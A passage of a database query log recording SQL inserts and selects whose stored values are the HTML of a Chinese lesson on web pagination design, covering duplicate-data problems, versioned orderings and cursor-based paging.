data-first-offset="true"><span data-slate-string="true">对于这个问题，我们也来看看有哪些解决方案。但是在看解决方案之前，我们先要明确，这是不是一个非得解决的问题。换言之，如果产品经理和程序员都觉得重复数据并不是什么大不了的事情，这个问题就可以放一放，我们不需要去解决那些“可以不是问题”（或者说优先极低）的问题。我知道很多人觉得这个太过浅显，甚至不值得讨论，但毕竟这是一个很基本的原则，做技术的我们在面对问题的时候始终需要明确，而不是一头扎进解决问题的泥塘里出不来了。</span></span></span> 
</div> <div class="se-86eb85a7 " data-slate-type="paragraph" data-slate-object="block" data-key="1572"> 
<span data-slate-object="text" data-key="1573"><span data-slate-leaf="true" data-offset-key="1573:0" 
data-first-offset="true"><span data-slate-string="true">至于解决方案，比较常见的包括这样几个：</span></span></span> 
</div> <div class="se-bce3da3a " data-slate-type="paragraph" data-slate-object="block" data-key="1574"> 
<span data-slate-object="text" data-key="1575"><span data-slate-leaf="true" data-offset-key="1575:0" 
data-first-offset="true"><span class="se-9debe3ea" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 结果过滤</span></span></span></span> </div> <div class="se-ce0abb2c 
" data-slate-type="paragraph" data-slate-object="block" data-key="1576"> <span data-slate-object="text" 
data-key="1577"><span data-slate-leaf="true" data-offset-key="1577:0" data-first-offset="true"><span 
data-slate-string="true">如果我们认定两次查询的结果中，可能出现重复，但是考虑到数据变更的速度是比较慢的，顺序的变化也是缓慢的，因此这个重复数据即便有，也会很少。那么，第二页展示的时候，我们把结果中第一页曾经出现过的这些个别的数据给干掉，这样就规避了数据重复的问题。</span></span></span> 
</div> <div class="se-ea621c75 " data-slate-type="paragraph" data-slate-object="block" data-key="1578"> 
<span data-slate-object="text" data-key="1579"><span data-slate-leaf="true" data-offset-key="1579:0" 
data-first-offset="true"><span data-slate-string="true">这大概是最简单的一种处理方式，但是其不足也是很明显的：</span></span></span> 
</div> <div class="se-39f34555" data-slate-type="list" data-slate-object="block" data-key="1580"> 
<div class="se-2f42eaf6 se-ae723a70" data-slate-type="list-line" data-slate-object="block" 
data-key="1581"> <span data-slate-object="text" data-key="1582"><span data-slate-leaf="true" 
data-offset-key="1582:0" data-first-offset="true"><span data-slate-string="true">说是“个别数据”，可到底有多少重复，这终究存在不可预测性，极端情况下第二页的数据可能会出现大量和第一页重复的情况，删除这些重复数据会导致第二页数据量特别少，从而引发糟糕的用户体验；</span></span></span> 
</div> <div class="se-8f246d41 se-996c0cb6" data-slate-type="list-line" data-slate-object="block" 
data-key="1583"> <span data-slate-object="text" data-key="1584"><span data-slate-leaf="true" 
data-offset-key="1584:0" data-first-offset="true"><span data-slate-string="true">数据丢失问题：既然第二页上出现第一页的重复，那就意味着存在某数据在用户查询第一页的时候它待在第二页，而用户查询第二页的时候又跑到第一页上去了，这样的数据最终没有返回给用户；</span></span></span> 
</div> <div class="se-bb1e2bfd se-4703eac3" data-slate-type="list-line" data-slate-object="block" 
data-key="1585"> <span data-slate-object="text" data-key="1586"><span data-slate-leaf="true" 
data-offset-key="1586:0" data-first-offset="true"><span data-slate-string="true">有第一页、第二页，那就还有第三页、第四页的问题，比如第一页的数据可能跟第四页重复啊，如果我们把这些因素都考虑进去，这个方案就没有那么“简单”了。</span></span></span> 
</div> </div> <div class="se-af06c60e " data-slate-type="paragraph" data-slate-object="block" 
data-key="1587"> <span data-slate-object="text" data-key="1588"><span data-slate-leaf="true" 
data-offset-key="1588:0" data-first-offset="true"><span class="se-d35c7b25" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">2. 独立的排序版本</span></span></span></span> 
</div> <div class="se-3967e28c " data-slate-type="paragraph" data-slate-object="block" data-key="1589"> 
<span data-slate-object="text" data-key="1590"><span data-slate-leaf="true" data-offset-key="1590:0" 
data-first-offset="true"><span data-slate-string="true">这个方法原理上也很简单，对于任何排序，都维持一个版本号。这样，在数据产生变化的时候，这个新的排序，需要采用一个不同的版本号。本质上，这就是把每次排序都单独拿出来维护，每一个排序都有一份独立的拷贝。</span></span></span> 
</div> <div class="se-5cbf9547 " data-slate-type="paragraph" data-slate-object="block" data-key="1591"> 
<span data-slate-object="text" data-key="1592"><span data-slate-leaf="true" data-offset-key="1592:0" 
data-first-offset="true"><span data-slate-string="true">这种方法适合这个排序变更不太频繁的情况，因为它的缺点很明显，就是要给每一份排序单独存放一份完整的拷贝。但是，它的优点也很明显，就是在多次查询的过程中，这个列表是静态的，不会改变的，不需要担心数据重复和丢失的问题。特别是对于开放的 
Web API 来说，我们经常需要用一个循环多次查询才能获取全量的数据，这个机制就很有用了。</span></span></span> </div> <div class="se-4e98c30b 
" data-slate-type="paragraph" data-slate-object="block" data-key="1593"> <span data-slate-object="text" 
data-key="1594"><span data-slate-leaf="true" data-offset-key="1594:0" data-first-offset="true"><span 
class="se-3fb81bc8" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">3. 
数据队列</span></span></span></span> </div> <div class="se-22cfbc40 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1595"> <span data-slate-object="text" data-key="1596"><span 
data-slate-leaf="true" data-offset-key="1596:0" data-first-offset="true"><span data-slate-string="true">在某些场景下，我们如果能保证数据的顺序不变，而添加的数据总在显示列表的一头，也就是说，把原本的数据集合变成一个队列，这样要解决重复数据问题的时候，就会有比较好的解决办法了。</span></span></span> 
</div> <div class="se-e2d4f134 " data-slate-type="paragraph" data-slate-object="block" data-key="1597"> 
<span data-slate-object="text" data-key="1598"><span data-slate-leaf="true" data-offset-key="1598:0" 
data-first-offset="true"><span class="se-900cbfeb" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">每次查询的时候，都记住了当前页最后一条记录的位置（比如我们可以使用自增长的 ID，或是使用数据添加时的 timestamp 来作为它“位置”的标记），而下一页，就从该记录开始继续往后查找就好了。</span></span></span></span><span 
data-slate-object="text" data-key="1599"><span data-slate-leaf="true" data-offset-key="1599:0" 
data-first-offset="true"><span data-slate-string="true">这样无论是否有新添加的数据，后面页数的切换，使用的都是相对位置，也就不会出现数据重复的问题了。看下面的例子：</span></span></span> 
</div> <div class="se-214e6710" data-slate-type="image" data-slate-object="block" data-key="1600"> 
<img class="se-8bc69a36" src="https://static001.geekbang.org/resource/image/76/0a/765eaf5e95d1edfb6480bec2419e4f0a.png"> 
</div> <div class="se-17a6b3b5 " data-slate-type="paragraph" data-slate-object="block" data-key="1601"> 
<span data-slate-object="text" data-key="1602"><span data-slate-leaf="true" data-offset-key="1602:0" 
data-first-offset="true"><span data-slate-string="true">你看，用户刚访问的时候，返回了 data 150 到 data 199 
这 50 条记录，并且记住了当前页尾的位置。用户再访问第二页的时候，其实已经有新的元素 data 200 加进来了，但是不管它，我们根据前一页的页尾的位置找到了第二页开头的位置，返回 
data 100 到 data 149 这 50 条记录。</span></span></span> </div> <div class="se-626af834 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1603"> <span data-slate-object="text" data-key="1604"><span 
data-slate-leaf="true" data-offset-key="1604:0" data-first-offset="true"><span data-slate-string="true">当然，只有一种例外，即只有用户访问第一页的时候（或者说，是用户的查询传入的“位置”参数为空的时候），才始终查询并返回最新的第一页数据。比如现在 
data 200 已经添加进来了，查询第一页的时候就返回 data 151 到 data 200 这最新的 50 条数据：</span></span></span> </div> <div 
class="se-c4b8cd86" data-slate-type="image" data-slate-object="block" data-key="1605"> <img 
class="se-e02845c7" src="https://static001.geekbang.org/resource/image/31/15/3187828c0233827684c8735e6f74c615.png"> 
</div> <div class="se-9eb658a8 " data-slate-type="paragraph" data-slate-object="block" data-key="1606"> 
<span data-slate-object="text" data-key="1607"><span data-slate-leaf="true" data-offset-key="1607:0" 
data-first-offset="true"><span data-slate-string="true">上述这种方式其实也挺常见的，特别像是新闻类网站（还有一些 SNS 网站），基本上一个栏目下新闻的发布都可以遵循这个队列的规则，即新发布的新闻总是可以放在最开始的位置，发布以后的新闻相对位置不发生改变。还有就是许多 
NoSQL 数据库用于查询特定页的 token，都是利用了这个机制。</span></span></span> </div> <h2 class="se-08808a82" data-slate-type="heading" 
data-slate-object="block" data-key="1608"><span data-slate-object="text" data-key="1609"><span 
data-slate-leaf="true" data-offset-key="1609:0" data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> 
<div class="se-c160fb76 " data-slate-type="paragraph" data-slate-object="block" data-key="1610"> 
<span data-slate-object="text" data-key="1611"><span data-slate-leaf="true" data-offset-key="1611:0" 
data-first-offset="true"><span data-slate-string="true">今天我们一起学习了分页的前前后后，既包括设计、实现，也包括对分页常见的重复数据的问题的分析，希望今天的内容能让你有所收获。</span></span></span> 
</div> <div class="se-8f41ddd5 " data-slate-type="paragraph" data-slate-object="block" data-key="1612"> 
<span data-slate-object="text" data-key="1613"><span data-slate-leaf="true" data-offset-key="1613:0" 
data-first-offset="true"><span data-slate-string="true">老规矩，我来提两个问题吧：</span></span></span> 
</div> <div class="se-b6ce342c" data-slate-type="list" data-slate-object="block" data-key="1614"> 
<div class="se-cddc2062 se-a3a2e2a2" data-slate-type="list-line" data-slate-object="block" 
data-key="1615"> <span data-slate-object="text" data-key="1616"><span data-slate-leaf="true" 
data-offset-key="1616:0" data-first-offset="true"><span data-slate-string="true">对于文中介绍的工具类 
Paginatior，我把方法签名写出来了，你能把这个类实现完整吗？</span></span></span> </div> <div class="se-f695cc87 se-9c2632ed" 
data-slate-type="list-line" data-slate-object="block" data-key="1617"> <span data-slate-object="text" 
data-key="1618"><span data-slate-leaf="true" data-offset-key="1618:0" data-first-offset="true"><span 
data-slate-string="true">对于“分页代码设计”一节中介绍的两种分页对象的设计方法，它们各有优劣，你能比较一下吗？</span></span></span> </div> 
</div> <div class="se-20340b13 " data-slate-type="paragraph" data-slate-object="block" data-key="1619"> 
<span data-slate-object="text" data-key="1620"><span data-slate-leaf="true" data-offset-key="1620:0" 
data-first-offset="true"><span data-slate-string="true">好，今天就到这里，欢迎你在留言区和我讨论。</span></span></span> 
</div> <h2 class="se-6f65dade" data-slate-type="heading" data-slate-object="block" data-key="1621"><span 
data-slate-object="text" data-key="1622"><span data-slate-leaf="true" data-offset-key="1622:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-e3295f71" data-slate-type="list" data-slate-object="block" data-key="1623"> <div 
class="se-2aa7c0c0 se-17a1ca46" data-slate-type="list-line" data-slate-object="block" data-key="1624"> 
<span data-slate-object="text" data-key="1625"><span data-slate-leaf="true" data-offset-key="1625:0" 
data-first-offset="true"><span data-slate-string="true">对于 Hibernate 分页查询用到的条件查询 API，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1626" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="1627"><span data-slate-leaf="true" data-offset-key="1627:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="1628"><span data-slate-leaf="true" data-offset-key="1628:0" 
data-first-offset="true"><span data-slate-string="true">，看到更多的例子；而对于通过 Projection 来取得总行数的代码，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="1629" class="se-e48fb8fa se-7e5be227"><span 
data-slate-object="text" data-key="1630"><span data-slate-leaf="true" data-offset-key="1630:0" 
data-first-offset="true"><span data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" 
data-key="1631"><span data-slate-leaf="true" data-offset-key="1631:0" data-first-offset="true"><span 
data-slate-string="true">有完整例子。</span></span></span> </div> <div class="se-9bcf9eb6 se-098db371" 
data-slate-type="list-line" data-slate-object="block" data-key="1632"> <span data-slate-object="text" 
data-key="1633"><span data-slate-leaf="true" data-offset-key="1633:0" data-first-offset="true"><span 
data-slate-string="true">本讲一开始的时候我提到，分页的设计上，有的是使用指定页码的，也是本讲的重点；还有一种是使用 token 的，这种方式也是很多 Web 
API 常提供的方式，你可以阅读 DynamoDB 的</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="1634" class="se-e48fb8fa se-7e5be227"><span data-slate-object="text" data-key="1635"><span 
data-slate-leaf="true" data-offset-key="1635:0" data-first-offset="true"><span data-slate-string="true">官方文档</span></span></span></a><span 
data-slate-object="text" data-key="1636"><span data-slate-leaf="true" data-offset-key="1636:0" 
data-first-offset="true"><span data-slate-string="true">了解一下它的分页 API。</span></span></span> 
</div> </div> <div class="se-8b383575" data-slate-type="image" data-slate-object="block" data-key="1637"> 
<img class="se-7839c6bb" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 7, 7) 
 {executed in 25 msec}
2020-11-19 11:02:51.616 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=7 
 {executed in 0 msec}
2020-11-19 11:02:51.617 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:02:51.639 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="1324" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-63570ab5 " data-slate-type="paragraph" data-slate-object="block" data-key="1325"> 
<span data-slate-object="text" data-key="1326"><span data-slate-leaf="true" data-offset-key="1326:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-e2b94780 " data-slate-type="paragraph" data-slate-object="block" data-key="1327"> 
<span data-slate-object="text" data-key="1328"><span data-slate-leaf="true" data-offset-key="1328:0" 
data-first-offset="true"><span data-slate-string="true">分页是全栈开发中非常常见的一个功能，绝大多数网站都需要用到。这个功能可谓麻雀虽小五脏俱全，是从呈现层、控制器层、到模型层，并和数据存储密切相关的真正的“全栈”功能。有时候你能见到一些清晰、明确的分页，也就是说，你能看到某一个内容的呈现被分成若干页，而当前又是在第几页；而有时候这个功能则是部分模糊了的，比方说，能翻页，但是并不显示总共有多少页。那今天，就让我们来了解一些典型的分页方法，理解分页的一些常见问题和它们的解决方式。</span></span></span> 
</div> <h2 class="se-ec4fb567" data-slate-type="heading" data-slate-object="block" data-key="1329"><span 
data-slate-object="text" data-key="1330"><span data-slate-leaf="true" data-offset-key="1330:0" 
data-first-offset="true"><span data-slate-string="true">物理分页和逻辑分页</span></span></span></h2> 
<div class="se-91b988eb " data-slate-type="paragraph" data-slate-object="block" data-key="1331"> 
<span data-slate-object="text" data-key="1332"><span data-slate-leaf="true" data-offset-key="1332:0" 
data-first-offset="true"><span data-slate-string="true">物理分页一般指的就是数据库分页，而逻辑分页则是程序员口中的“内存分页”。前者是通过条件查询的方式，从数据库中取出特定的数据段来，而后者，则是在完整数据都加载在内存中的情况下，从中取出特定段的数据来。</span></span></span> 
</div> <div class="se-599de885 " data-slate-type="paragraph" data-slate-object="block" data-key="1333"> 
<span data-slate-object="text" data-key="1334"><span data-slate-leaf="true" data-offset-key="1334:0" 
data-first-offset="true"><span data-slate-string="true">显然我们一般情况下更关注物理分页，因为内存的大小总是更为有限，多数情况下我们希望通过条件查询的方式去数据库中取出特定页来。但是也有反例，比方说某些数据量不大，但是访问频率较高的数据，以“缓存”的形式预加载到内存中，再根据客户端的分页条件返回数据，这种方式一样可以遵循分页接口，但是由于被分页的数据是全部在内存中的，这样的数据一般需要遵循如下几个要求：</span></span></span> 
</div> <div class="se-3c7438bc" data-slate-type="list" data-slate-object="block" data-key="1335"> 
<div class="se-f4ed726d se-78d591c7" data-slate-type="list-line" data-slate-object="block" 
data-key="1336"> <span data-slate-object="text" data-key="1337"><span data-slate-leaf="true" 
data-offset-key="1337:0" data-first-offset="true"><span data-slate-string="true">数据量不大，可以放在内存中；</span></span></span> 
</div> <div class="se-1a5b8552 se-a526e625" data-slate-type="list-line" data-slate-object="block" 
data-key="1338"> <span data-slate-object="text" data-key="1339"><span data-slate-leaf="true" 
data-offset-key="1339:0" data-first-offset="true"><span data-slate-string="true">一致性满足要求，或者使用专门的设计维护内存中数据的一致性；</span></span></span> 
</div> <div class="se-e9f1a9b9 se-5b8dac74" data-slate-type="list-line" data-slate-object="block" 
data-key="1340"> <span data-slate-object="text" data-key="1341"><span data-slate-leaf="true" 
data-offset-key="1341:0" data-first-offset="true"><span data-slate-string="true">持久性方面，数据允许丢失，因为在内存中，断电即丢失。</span></span></span> 
</div> </div> <h2 class="se-a34fe046" data-slate-type="heading" data-slate-object="block" data-key="1342"><span 
data-slate-object="text" data-key="1343"><span data-slate-leaf="true" data-offset-key="1343:0" 
data-first-offset="true"><span data-slate-string="true">分页代码设计</span></span></span></h2> <div 
class="se-26085949 " data-slate-type="paragraph" data-slate-object="block" data-key="1344"> 
<span data-slate-object="text" data-key="1345"><span data-slate-leaf="true" data-offset-key="1345:0" 
data-first-offset="true"><span data-slate-string="true">分页这个事儿从功能抽象的角度看基本不复杂，但是我们也经常能看到不同的实现。比较常见的有两种，指定页码的分页，以及使用 
token 的分页，当然，严格来说，页码其实是 token 的一种特殊形式。就以指定页码的分页为例，在实际代码层面上，我见到的分页代码设计包括这样两种。</span></span></span> 
</div> <h3 class="se-dd41f9f7" data-slate-type="heading" data-slate-object="block" data-key="1346"><span 
data-slate-object="text" data-key="1347"><span data-slate-leaf="true" data-offset-key="1347:0" 
data-first-offset="true"><span data-slate-string="true">单独的分页工具类</span></span></span></h3> 
<div class="se-093f225c " data-slate-type="paragraph" data-slate-object="block" data-key="1348"> 
<span data-slate-object="text" data-key="1349"><span data-slate-leaf="true" data-offset-key="1349:0" 
data-first-offset="true"><span class="se-670867b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">第一种是彻底把 DAO 的查询逻辑拿出去，创建一个单独的分页工具类 Paginator。</span></span></span></span><span 
data-slate-object="text" data-key="1350"><span data-slate-leaf="true" data-offset-key="1350:0" 
data-first-offset="true"><span data-slate-string="true">这个工具的实例对象只负责分页状态的存储和变更，不知道也不管理数据，在实例化的时候需要 
totalCount 和 pageSize 两个参数，前者表示总共有多少条数据，后者表示每一页最多显示多少条。</span></span></span> </div> <div class="se-1ec3d393 
" data-slate-type="paragraph" data-slate-object="block" data-key="1351"> <span data-slate-object="text" 
data-key="1352"><span data-slate-leaf="true" data-offset-key="1352:0" data-first-offset="true"><span 
data-slate-string="true">DAO 的查询接口自己去创建或者接纳一个 Paginatior 对象，其实现会调用对象的 getStart() 和 getEnd() 
方法，从而知道查询时数据的范围。请看这个 Paginatior 的例子，我把方法内的具体实现省略了：</span></span></span> </div> <div class="se-54b85fc5 
se-32b01939" data-slate-type="pre" data-slate-object="block" data-key="1353" data-code-language="java"> 
<div class="se-2b987ac9 se-dba3612c"> <span></span> </div> <div class="se-b1bd0e78"> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="1"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="2"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="3"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="4"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="5"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="6"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="7"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="8"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="9"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="10"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="11"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="12"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="13"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="14"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="15"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="16"></div> <div class="se-487a8091 se-6bf256d7" data-code-line-number="17"></div> 
<div class="se-487a8091 se-6bf256d7" data-code-line-number="18"></div> <div class="se-487a8091 
se-6bf256d7" data-code-line-number="19"></div> </div> <div class="se-6ad4a9e9 ps ps--active-x"> 
<div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1354"> <span data-slate-object="text" data-key="1355"><span data-slate-leaf="true" 
data-offset-key="1355:0" data-first-offset="true"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4844786653" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1355:1"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1355:2"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_1292692475" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" data-annotation-type="annotation"><span 
data-slate-string="true">Paginatior</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1355:3"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2817674732" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1355:4"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1356"> <span data-slate-object="text" data-key="1357"><span data-slate-leaf="true" 
data-offset-key="1357:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1357:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5092645746" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_6554093065" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1357:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1357:3"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_7494274499" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5092645746" data-annotation-type="annotation"><span 
data-slate-string="true">Paginatior</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1357:4"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_0100936935" data-annotation-type="annotation"><span data-slate-string="true">(int 
totalCount, int pageSize)</span></span></span></span><span data-slate-leaf="true" data-offset-key="1357:5"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5092645746" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1357:6"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1358"> <span data-slate-object="text" data-key="1359"><span data-slate-leaf="true" 
data-offset-key="1359:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1360"> <span data-slate-object="text" data-key="1361"><span data-slate-leaf="true" 
data-offset-key="1361:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1361:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2262825866" data-annotation-type="annotation"><span data-slate-string="true">// 
翻页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1362"> <span data-slate-object="text" data-key="1363"><span 
data-slate-leaf="true" data-offset-key="1363:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1363:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5291133461" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1363:3"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_9400222558" 
data-annotation-type="annotation"><span data-slate-string="true">void</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1363:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_0445706042" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true">turnToNextPage</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_3250295094" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3147051779" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1363:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3147051779" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1363:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1364"> <span data-slate-object="text" data-key="1365"><span data-slate-leaf="true" 
data-offset-key="1365:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1365:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_2604810586" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1365:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0796588418" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9466637054" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span 
data-slate-string="true">void</span></span></span></span><span data-slate-leaf="true" data-offset-key="1365:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0796588418" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6687138105" data-annotation-type="annotation"><span 
data-slate-string="true">turnToPrevPage</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1365:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_6032392230" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1365:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0796588418" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1365:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1366"> <span data-slate-object="text" data-key="1367"><span data-slate-leaf="true" 
data-offset-key="1367:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1367:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9630980825" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span class=" gkhl-keyword" 
